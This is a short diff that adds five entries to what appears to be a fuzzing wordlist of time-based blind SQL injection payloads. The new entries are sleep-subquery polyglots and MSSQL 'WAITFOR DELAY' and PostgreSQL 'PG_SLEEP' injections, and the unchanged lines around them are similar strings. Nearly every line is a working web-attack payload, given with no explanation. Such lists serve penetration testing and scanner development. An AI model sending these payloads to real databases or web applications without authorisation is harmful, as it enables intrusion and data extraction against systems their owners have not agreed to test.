@@ -21,6 +21,11 @@ if(now()=sysdate()%2Csleep(4*2)%2C0)
 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 1;SELECT IF((8303>8302),SLEEP(9),2356)#
 (SELECT(0)FROM(SELECT(SLEEP(7)))a)
+(select(0)from(select(sleep(6)))v)/*'+
+(select(0)from(select(sleep(6)))v)+'"+
+(select(0)from(select(sleep(6)))v)+"*/
+orwa';%20waitfor%20delay%20'0:0:6'%20--%20
+orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
 0'||pg_sleep(10)--
 ;waitfor delay '0:0:5'--
 ';WAITFOR DELAY '0:0:5'--
